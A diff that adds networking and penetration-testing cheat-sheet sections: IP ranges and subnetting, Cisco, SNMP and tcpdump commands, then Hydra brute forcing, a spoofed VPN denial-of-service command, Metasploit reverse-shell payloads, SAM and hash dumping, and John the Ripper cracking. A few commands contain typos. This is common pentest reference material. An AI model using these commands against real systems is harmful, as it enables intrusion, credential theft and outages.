@@ -1747,7 +1747,320 @@ Common ports [[6]]
 | 5900 | TCP | VNC |
 | 6346 | TCP, UDP | Gnutella p2p network |
 | 8080 | TCP | HTTP |
-|
 
 [6]:<http://packetlife.net/media/library/23/common_ports.pdf>
 
+IPv4 
+----
+
+### CLASSFULL IP RANGES [[17]]
+
+    Class A
+      0.  0.  0.  0 = 00000000.00000000.00000000.00000000
+    127.255.255.255 = 01111111.11111111.11111111.11111111
+                      0nnnnnnn.HHHHHHHH.HHHHHHHH.HHHHHHHH
+    
+    Class B
+    128.  0.  0.  0 = 10000000.00000000.00000000.00000000
+    191.255.255.255 = 10111111.11111111.11111111.11111111
+                      10nnnnnn.nnnnnnnn.HHHHHHHH.HHHHHHHH
+    
+    Class C
+    192.  0.  0.  0 = 11000000.00000000.00000000.00000000
+    223.255.255.255 = 11011111.11111111.11111111.11111111
+                      110nnnnn.nnnnnnnn.nnnnnnnn.HHHHHHHH
+    
+    Class D
+    224.  0.  0.  0 = 11100000.00000000.00000000.00000000
+    239.255.255.255 = 11101111.11111111.11111111.11111111
+                      1110XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX
+    
+    Class E
+    240.  0.  0.  0 = 11110000.00000000.00000000.00000000
+    255.255.255.255 = 11111111.11111111.11111111.11111111
+                      1111XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX
+    
+    - n: indicates a bit used for the network ID
+    - H: indicates a bit used for the host ID
+    - X: indicates a bit without a specified purpose
+  
+### Reserved ranges [[18]]
+
+    0.0.0.0/8       # Used for broadcast messages to the current ("this")
+    10.0.0.0/8      # Used for local communications within a private network
+    100.64.0.0/10   # Used for communications between a service provider and its subscribers when using a carrier-grade NAT
+    127.0.0.0/8     # Used for loopback addresses to the local host
+    169.254.0.0/16  # Used for link-local addresses between two hosts on a single link when no IP address is otherwise specified, such as would have normally been retrieved from a DHCP server
+    172.16.0.0/12   # Used for local communications within a private network
+    192.0.0.0/24    # Used for the IANA IPv4 Special Purpose Address Registry
+    192.0.2.0/24    # Assigned as "TEST-NET" for use in documentation and examples. It should not be used publicly
+    192.88.99.0/24  # Used by 6to4 anycast relays
+    192.168.0.0/16  # Used for local communications within a private network
+    198.18.0.0/15   # Used for testing of inter-network communications between two separate subnets
+    198.51.100.0/24 # Assigned as "TEST-NET-2" for use in documentation and examples. It should not be used publicly
+    203.0.113.0/24  # Assigned as "TEST-NET-3" for use in documentation and examples. It should not be used publicly
+    224.0.0.0/4     # Reserved for multicast
+    240.0.0.0/4     # Reserved for future use
+    255.255.255.255/32  # Reserved for the "limited broadcast" destination address
+    
+### Subnetting [[19]]
+
+![class_a_subnets.jpg](https://www.dropbox.com/s/i7k6anrqrew7q8h/class_a_subnets.jpg?dl=0&raw=1)
+
+### Calculating subnet range [[20]]
+
+    Address:   192.168.0.1           11000000.10101000.00000000 .00000001
+    Netmask:   255.255.255.0 = 24    11111111.11111111.11111111 .00000000
+    Wildcard:  0.0.0.255             00000000.00000000.00000000 .11111111
+    =>
+    Network:   192.168.0.0/24        11000000.10101000.00000000 .00000000       (Class C)
+    Broadcast: 192.168.0.255         11000000.10101000.00000000 .11111111
+    HostMin:   192.168.0.1           11000000.10101000.00000000 .00000001
+    HostMax:   192.168.0.254         11000000.10101000.00000000 .11111110
+    Hosts/Net: 254                   (Private Internet)
+    
+[17]:<https://en.wikipedia.org/wiki/Classful_network>
+[18]:<https://en.wikipedia.org/wiki/Reserved_IP_addresses>
+[19]:<https://www.tutorialspoint.com/ipv4/ipv4_subnetting.htm>
+[20]:<http://jodies.de/ipcalc?host=192.168.0.1&mask1=24&mask2=>
+
+IPv6
+----
+
+### Broadcast addresses [[21]]
+
+    ff02:: 	# Link Local: spans the same topological region as the corresponding unicast scope, i.e. all nodes on the same LAN
+    ff05:: 	# Site local: is intended to span a single site
+    ff08:: 	# Organization scope: Intended to span multiple sizes within the same organization
+    ff0e:: 	# Global scope, assigned by IANA
+    ff01:: 	# Interface local: Spans only a single interface on a node and is useful only for loopback transmission of multicast
+
+### Interface adresses [[22]]
+
+    fe80::          # link-local
+    2001::          # routable
+    ::a.b.c.d       # IPv4 compatible IPv6
+    ::ffff:a.b.c.d  # IPv4 mapped IPv6
+    
+### THC Ipv6 Toolkit [[23]]
+
+    rsmurf6     # Smurfs the local network of the victim
+
+
+
+[21]:<http://ipv6friday.org/blog/2011/12/ipv6-multicast/>
+[22]:<https://tools.ietf.org/html/rfc4291#appendix-A>
+[23]:<http://tools.kali.org/information-gathering/thc-ipv6>
+
+Cisco commands
+--------------
+
+### Exec commands [[4]]
+
+    <1-99>           # Session number to resume
+    connect          # Open a terminal connection
+    disconnect       # Disconnect an existing telnet session
+    enable           # Turn on privileged commands
+    exit             # Exit from Exec mode
+    help             # Description of the interactive help system
+    lat              # Open a lat connection
+    lock             # Lock the terminal
+    login            # Log in as a particular user
+    logout           # Exit from Exec mode and log out
+    menu             # Start a menu-based user interface
+    mbranch          # Trace multicast route for branch of tree
+    mrbranch         # Trace reverse multicast route to branch of tree
+    mtrace           # Trace multicast route to group
+    name-connection  # Name an existing telnet connection
+    pad              # Open a X.29 PAD connection
+    ping             # Send echo messages
+    resume           # Resume an active telnet connection
+    show             # Show running system information
+    systat           # Display information about terminal lines
+    telnet           # Open a telnet connection
+    terminal         # Set terminal line parameters
+    tn3270           # Open a tn3270 connection
+    trace            # Trace route to destination
+    where            # List active telnet connections
+    x3               # Set X.3 parameters on PAD
+    
+### Common commands [[5]]
+
+    ?                                                   # Help
+    show running-configuration                          # Shows the router, switch, or firewall's current configuration
+    copy running-configuration startup-configuration    # Save the configuration that is currently being modified (in RAM), also known as the running-configuration, to the nonvolatile RAM (NVRAM)   
+    show interface                                      # Displays the status of the router's interfaces
+    show ip interface                                   # Provides information about the configuration and status of the IP protocol and its services, on all interfaces.
+    config terminal, enable, interface, and router      # Change modes
+    no shutdown                                         # Enables an interface (brings it up)
+    show ip route                                       # Show the router's routing table
+    show version                                        # Gives you the router's configuration register
+    debug                                               # It provides detailed debugging output on a certain application, protocol, or service
+    
+[4]: <http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/configuration/guide/ffun_c/fcf001.html>
+[5]:<http://www.techrepublic.com/blog/data-center/10-commands-you-should-master-when-working-with-the-cisco-ios-104071/>
+
+SNMP
+----
+
+### Concept [[43]]
+
+![snmp.png](https://www.dropbox.com/s/srwfkxgbqyep6yo/snmp.png?dl=0&raw=1)
+
+### Command Examples [[44]]
+This command returns an administratively assigned name for this managed node.
+
+    % snmpget -mALL -v1 -cpublic snmp_agent_Ip_address sysName.0
+The snmpwalk command performs a sequence of chained GETNEXT requests automatically. It is a work saving command.
+
+    % snmpwalk -mALL -v1 -cpublic snmp_agent_Ip_address system
+    
+The snmpbulkwalk command uses the GETBULK SNMP protocol feature to query for an entire tree of information about a network entity
+
+    % snmpbulkwalk -mALL -v2c -cprivate snmp_agent_Ip_address entPhysicalTable>time7
+
+    
+    
+[43]: <http://www.cert.hr/sites/default/files/NCERT-PUBDOC-2010-09-313.pdf>
+[44]: <https://docs.oracle.com/cd/E19201-01/820-6413-13/SNMP_commands_reference_appendix.html>
+
+Packet Capturing [[38]]
+-----------------------
+
+    tcpdump -i eth0                     # Capture Packets From Specific Interface
+    tcpdump -c 5 -i eth0                # Capture Only N Number of Packets
+    tcpdump -A -i eth0                  # Print Captured Packets in ASCII
+    tcpdump -D                          # Display Available Interfaces  
+    tcpdump -XX -i eth0                 # Display Captured Packets in HEX and ASCII
+    tcpdump -w 0001.pcap -i eth0        # Capture and Save Packets in a File
+    tcpdump -r 0001.pcap                # Read Captured Packets File
+    tcpdump -n -i eth0                  # Capture IP address Packets
+    tcpdump -i eth0 tcp                 # Capture only TCP Packets
+    tcpdump -i eth0 port 22             # Capture Packet from Specific Port
+    tcpdump -i eth0 src 192.168.0.2     # Capture Packets from source IP
+    tcpdump -i eth0 dst 50.116.66.139   # Capture Packets from destination IP
+    
+[38]: <http://www.tecmint.com/12-tcpdump-commands-a-network-sniffer-tool/>
+
+DNS
+---
+
+### dnsrecon Usage Example[[7]]
+
+Scan a domain (-d example.com), use a dictionary to brute force hostnames (-D /usr/share/wordlists/dnsmap.txt), do a standard scan (-t std), and save the output to a file (–xml dnsrecon.xml)
+
+    nsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
+    
+### Ping scan grepable output [[8]]
+
+    # nmap -sn -oG - -iR 100
+    # Nmap 5.35DC18 scan initiated [time] as: nmap -sn -oG - -iR 5
+    Host: 93.182.218.153 () Status: Up
+    Host: 154.223.142.85 () Status: Down
+    Host: 120.128.8.97 ()   Status: Down
+    Host: 47.159.134.149 () Status: Down
+    Host: 24.172.4.19 ()    Status: Down
+    # Nmap done at [time] -- 5 IP addresses (1 host up) scanned in 4.25 seconds
+
+[7]: <http://tools.kali.org/information-gathering/dnsrecon>
+[8]: <https://nmap.org/book/output-formats-grepable-output.html>
+
+VPN [[50]]
+----------
+
+### Write PSK to a file
+
+    ike-scan -M -A vpn ip -P file
+        
+### DoS VPN SERVER
+
+    ike-scan -A -t 1 --sourceip= spoof ip dst ip
+
+[50]: <https://github.com/royhills/ike-scan>
+
+Brute Forcing Services [[2]]
+----------------------------
+
+### Hydra FTP Brute Force
+
+	hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V
+
+### Hydra POP3 Brute Force
+
+	hydra -l USERNAME -P /usr/sha/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V
+     
+### Hydra SMTP Brute Force
+
+	hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
+	
+[2]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#brute-forcing-services>
+
+Exploit Research [[9]]
+----------------------
+
+	searchsploit windows 2003 | grep -i local                                # Search exploit-db for exploit, in this example windows 2003 + local esc
+	site:exploit-db.com exploit kernel <= 3                                  # Use google to search exploit-db.com for exploits
+	grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*   # Search metasploit modules using grep - msf search 
+		
+[9]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploit-research>
+
+Metasploit [[36]]
+-----------------
+
+### Meterpreter Payloads
+
+    set payload windows/meterpreter/reverse_tcp     # Windows reverse tcp payload
+    set payload windows/vncinject/reverse_tcp       # Meterpreter Windows VNC Payload
+    set ViewOnly false
+    set payload linux/meterpreter/reverse_tcp       # Meterpreter Linux Reverse Payload
+    
+### Meterpreter Cheat Sheet
+
+    upload file c:\\windows                  # Meterpreter upload file to Windows target
+    download c:\\windows\\repair\\sam /tmp   # Meterpreter download file from Windows target
+    download c:\\windows\\repair\\sam /tmp   # Meterpreter download file from Windows target
+    execute -f c:\\windows\temp\exploit.exe  # Meterpreter run .exe on target - handy for executing uploaded exploits
+    execute -f cmd -c                        # Creates new channel with cmd shell
+    ps                                       # Meterpreter show processes
+    shell                                    # Meterpreter get shell on the target
+    getsystem                                # Meterpreter attempts priviledge escalation on the target
+    hashdump                                 # Meterpreter attempts to dump the hashes on the target
+    portfwd add –l 3389 –p 3389 –r target    # Meterpreter create port forward to target machine
+    portfwd delete –l 3389 –p 3389 –r target # Meterpreter delete port forward
+
+### Auxilary Metasploit Modules
+
+    use auxiliary/scanner/http/dir_scanner      # Metasploit HTTP directory scanner
+    use auxiliary/scanner/http/jboss_vulnscan   # Metasploit JBOSS vulnerability scanner
+    use auxiliary/scanner/mssql/mssql_login     # Metasploit MSSQL Credential Scanner
+    use auxiliary/scanner/mysql/mysql_version   # Metasploit MSSQL Version Scanner
+    use auxiliary/scanner/oracle/oracle_login   # Metasploit Oracle Login Module
+
+### Metasploit Powershell Modules
+
+    use exploit/multi/script/web_delivery          # Metasploit powershell payload delivery module
+    post/windows/manage/powershell/exec_powershell # Metasploit upload and run powershell script through a session
+    use exploit/multi/http/jboss_maindeployer      # Metasploit JBOSS deploy
+    use exploit/windows/mssql/mssql_payload        # Metasploit MSSQL payload
+
+[36]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit>
+
+Password Cracking [[39]]
+------------------------
+
+## John The Ripper - JTR
+
+###JTR password cracking
+
+	john --wordlist=/usr/share/wordlists/rockyou.txt hashes	
+	
+### JTR forced descrypt cracking with wordlist
+
+	john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
+	
+
+### JTR forced descrypt cracking with wordlist
+
+	john --format=descrypt hash --show
+	
+[39]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#john-the-ripper---jtr>
